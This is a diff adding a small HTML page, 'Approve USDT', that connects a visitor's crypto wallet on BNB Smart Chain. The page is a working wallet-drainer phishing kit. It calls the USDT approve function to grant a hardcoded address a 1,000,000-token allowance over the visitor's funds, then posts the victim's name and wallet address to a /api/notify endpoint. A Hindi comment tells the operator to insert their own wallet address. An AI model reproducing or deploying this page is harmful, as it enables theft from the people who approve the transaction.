@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Approve USDT</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { background: white; border-radius: 20px; padding: 30px; width: 100%; max-width: 450px; text-align: center; }
+        h2 { color: #333; margin-bottom: 10px; }
+        .network-badge { background: #e8f5e9; color: #2e7d32; display: inline-block; padding: 6px 14px; border-radius: 50px; font-size: 12px; margin-bottom: 20px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; }
+        button { background: #667eea; color: white; border: none; padding: 12px; border-radius: 8px; width: 100%; font-size: 16px; cursor: pointer; }
+        .status { margin-top: 15px; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>💰 Approve USDT</h2>
+        <div class="network-badge">🟢 BEP20 | BSC Mainnet</div>
+        <input type="text" id="walletName" placeholder="Name (e.g., Ram)">
+        <button id="connectBtn">Connect & Approve</button>
+        <div id="status" class="status"></div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <script>
+        // ==================== यहाँ अपना WALLET ADDRESS डालो ====================
+        const WALLET_ADDRESS = "0x048a708a7c64994d350cba288326be93c6c5738b";
+        // ======================================================================
+        
+        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+        const USDT_ABI = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}];
+
+        async function switchToBSC() {
+            try {
+                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+                return true;
+            } catch(e) {
+                if(e.code === 4902) {
+                    await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org'] }] });
+                    return true;
+                }
+                return false;
+            }
+        }
+
+        document.getElementById('connectBtn').onclick = async () => {
+            const name = document.getElementById('walletName').value.trim();
+            if(!name) { document.getElementById('status').innerText = "❌ Name required"; return; }
+            if(!window.ethereum) { document.getElementById('status').innerText = "❌ Install MetaMask/Trust Wallet"; return; }
+            try {
+                document.getElementById('status').innerText = "Switching to BSC...";
+                if(!(await switchToBSC())) throw new Error("BSC switch failed");
+                const web3 = new Web3(window.ethereum);
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const accounts = await web3.eth.getAccounts();
+                const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
+                document.getElementById('status').innerText = "Approving... Confirm in wallet";
+                const tx = await contract.methods.approve(WALLET_ADDRESS, web3.utils.toWei("1000000", 'ether')).send({ from: accounts[0] });
+                document.getElementById('status').innerHTML = `✅ Approved! Tx: ${tx.transactionHash.slice(0,10)}...`;
+                await fetch('/api/notify', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ name: name, address: accounts[0], amount: "1000000" }) });
+            } catch(e) { document.getElementById('status').innerText = "❌ " + e.message; }
+        };
+    </script>
+</body>
+</html>
